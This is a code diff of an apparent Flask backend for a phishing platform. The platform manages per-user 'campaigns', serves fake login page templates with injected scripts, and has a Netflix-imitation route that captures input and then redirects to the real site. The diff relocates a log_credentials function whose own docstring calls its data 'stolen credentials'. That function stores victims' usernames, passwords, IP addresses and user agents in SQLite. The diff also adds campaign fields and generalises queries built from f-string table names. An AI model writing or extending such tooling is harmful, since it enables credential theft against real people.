@@ -60,7 +60,7 @@ def create_new_campaign_db(user_id, campaign_name):
 
     return campaign_db_path
 
-def create_campaigns_db(user_id, campaign_name, template=''):
+def create_campaigns_db(user_id, campaign_name, page_name, users_number=0, template=False):
     user_folder = f"{USERS_DIR}/{user_id}"
     campaigns_db_dir = os.path.join(user_folder, CAMPAIGNS_DIR)
     db_path = os.path.join(campaigns_db_dir, CAMPAIGNS_DB)
@@ -80,7 +80,9 @@ def create_campaigns_db(user_id, campaign_name, template=''):
                 name TEXT,
                 date_created DATE,
                 time_created TIME,
-                template TEXT DEFAULT "{template}"
+                page_name TEXT DEFAULT "{page_name}",
+                users_number INTEGER DEFAULT {users_number},
+                template INTEGER DEFAULT {1 if template else 0}
             )
         """)
 
@@ -88,9 +90,9 @@ def create_campaigns_db(user_id, campaign_name, template=''):
 
         # Insert new campaign if it doesn't exist
         cursor.execute("""
-            INSERT INTO campaigns (name, date_created, time_created, template)
-            VALUES (?, ?, ?, ?)
-        """, (campaign_name, date_created, time_created, template))
+            INSERT INTO campaigns (name, date_created, time_created, page_name, users_number, template)
+            VALUES (?, ?, ?, ?, ?, ?)
+        """, (campaign_name, date_created, time_created, page_name, users_number, template))
 
         conn.commit()
         print(f"Campaign '{campaign_name}' added to the database.")
@@ -129,33 +131,17 @@ def create_campaign_js_file(user_id, campaign_name, txt):
         print(f"An error occurred: {e}")
         return None
 
-def fetch_campaigns(user_id):
-    """Fetch campaigns form user."""
-    user_folder = f"{USERS_DIR}/{user_id}"
-    campaigns_db_dir = os.path.join(user_folder, CAMPAIGNS_DIR)
-    db_path = os.path.join(campaigns_db_dir, CAMPAIGNS_DB)
-
-    conn = sqlite3.connect(db_path)
-    cursor = conn.cursor()
-
-    cursor.execute("SELECT * FROM campaigns")
-    campaigns = cursor.fetchall()
-
-    conn.close()
-    return campaigns
-
-
-def fetch_campaign_data(db_path):
+def fetch_data(db_path, table_name):
     """Fetch content from a specific campaign database and return as a list of dictionaries."""
     conn = sqlite3.connect(db_path)
     cursor = conn.cursor()
 
     # Fetch column names
-    cursor.execute("PRAGMA table_info(credentials)")
+    cursor.execute(f"PRAGMA table_info({table_name})")
     columns = [column[1] for column in cursor.fetchall()]  # Extract column names
 
     # Fetch all rows
-    cursor.execute("SELECT * FROM credentials")
+    cursor.execute(f"SELECT * FROM {table_name}")
     campaigns = cursor.fetchall()
 
     conn.close()
@@ -163,6 +149,23 @@ def fetch_campaign_data(db_path):
     # Convert to list of dictionaries
     return [dict(zip(columns, row)) for row in campaigns]
 
+# def fetch_campaign_data(db_path):
+#     """Fetch content from a specific campaign database and return as a list of dictionaries."""
+#     conn = sqlite3.connect(db_path)
+#     cursor = conn.cursor()
+
+#     # Fetch column names
+#     cursor.execute("PRAGMA table_info(credentials)")
+#     columns = [column[1] for column in cursor.fetchall()]  # Extract column names
+
+#     # Fetch all rows
+#     cursor.execute("SELECT * FROM credentials")
+#     campaigns = cursor.fetchall()
+
+#     conn.close()
+
+#     # Convert to list of dictionaries
+#     return [dict(zip(columns, row)) for row in campaigns]
 
 def remove_db_file(file_name):
     if os.path.exists(file_name):
@@ -195,6 +198,20 @@ def remove_campaign(user_id, campaign_name):
             conn.close()
             print("Database connection closed.")
 
+def log_credentials(db, page, username, password, ip):
+    """Log stolen credentials into SQLite database"""
+    user_agent = request.headers.get('User-Agent')
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    conn = sqlite3.connect(db)
+    cursor = conn.cursor()
+    cursor.execute("""
+        INSERT INTO credentials (page, username, password, ip, user_agent, timestamp)
+        VALUES (?, ?, ?, ?, ?, ?)
+    """, (page, username, password, ip, user_agent, timestamp))
+    
+    conn.commit()
+    conn.close()
 
 #################################################################
 # ROUTES  >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
@@ -204,12 +221,14 @@ def get_campaigns(user_id):
     user_db_folder = os.path.join(USERS_DIR, user_id, DBS_DIR)
     
     if not os.path.exists(user_db_folder):
-        return jsonify({"error": "User database folder not found"}), 404
+        return jsonify({"message": "No campaigns found"}), 200
     
-  
-    campaigns= fetch_campaigns(user_id)
+    
+    db_path = os.path.join(USERS_DIR, user_id, CAMPAIGNS_DIR, CAMPAIGNS_DB)
+    campaigns= fetch_data(db_path=db_path, table_name="campaigns" )
         
     return jsonify(campaigns), 200
+
 
 @app.route('/campaigns/fetch_campaign', methods=['POST'])
 def get_campaign():
@@ -223,7 +242,7 @@ def get_campaign():
         return jsonify({"message": "User database folder not found"}), 404
         
 
-    campaign_data = fetch_campaign_data(db_path)
+    campaign_data = fetch_data(db_path, "credentials")
     campaigns_with_data = {
         "name": campaign_name,
         "data": campaign_data
@@ -236,7 +255,8 @@ def get_campaign_script():
     data = request.json
     user_id = str(data.get("user_id"))
     campaign_name = str(data.get("campaign_id"))
-    template = str(data.get("template"))
+    template = bool(data.get("template"))
+    page_name = data.get("page_name")
 
     db_path = os.path.join(USERS_DIR, str(user_id), DBS_DIR, f'{campaign_name}.db')
     
@@ -247,7 +267,7 @@ def get_campaign_script():
 
     if template:
         html_page = add_script_to_html(
-            html_path=os.path.join(TEMPLATES_DIR, template),
+            html_path=os.path.join(TEMPLATES_DIR, f"{page_name}.html"),
             script=campaign_js_script
         )
         script_to_send = html_page
@@ -265,6 +285,7 @@ def create_campaign():
     user_id = data.get("user_id")
     campaign_name = data.get("name")
     template = data.get("template")
+    page_name = data.get("page_name")
 
 
     user_folder = f"{USERS_DIR}/{user_id}/{DBS_DIR}"
@@ -278,8 +299,14 @@ def create_campaign():
     if not new_campaign_db_path:
         return jsonify({"message": "Campaign already exists under this name"}), 409
 
+    campaigns_db_path = create_campaigns_db(
+        user_id=user_id, 
+        campaign_name=campaign_name, 
+        page_name=page_name, 
+        users_number=0, 
+        template=template
+        )
     
-    campaigns_db_path = create_campaigns_db(user_id, campaign_name, template)
     if not campaigns_db_path:
         # Remove the campaign created because something when wrong in generating the code
         remove_db_file(campaign_db_file)
@@ -319,7 +346,6 @@ def campaign_page(user_id, campaign_name):
         
     return "True", 200
 
-
 @app.route('/login', methods=['POST'])
 def login():
 
@@ -341,7 +367,6 @@ def login():
     else:
         return jsonify({"error": "Invalid credentials"}), 401
 
-
 @app.route('/templates', methods=['GET'])
 def list_templates():
     templates = []
@@ -350,7 +375,7 @@ def list_templates():
             if template.endswith(".html"):
                 templates.append(
                     {
-                        'name': template,
+                        'name': template.split('.')[0],    # name without ext
                         'template': open(os.path.join(TEMPLATES_DIR, template), 'r').read()        
                     }
 
@@ -374,23 +399,6 @@ def netflix():
         return redirect("https://www.netflix.com/")  # Redirect after capturing
 
     return render_template('netflix.html')
-
-def log_credentials(db, page, username, password, ip):
-    """Log stolen credentials into SQLite database"""
-    user_agent = request.headers.get('User-Agent')
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-
-    conn = sqlite3.connect(db)
-    cursor = conn.cursor()
-    cursor.execute("""
-        INSERT INTO credentials (page, username, password, ip, user_agent, timestamp)
-        VALUES (?, ?, ?, ?, ?, ?)
-    """, (page, username, password, ip, user_agent, timestamp))
-    
-    conn.commit()
-    conn.close()
-
-
 
 
 if __name__ == '__main__':
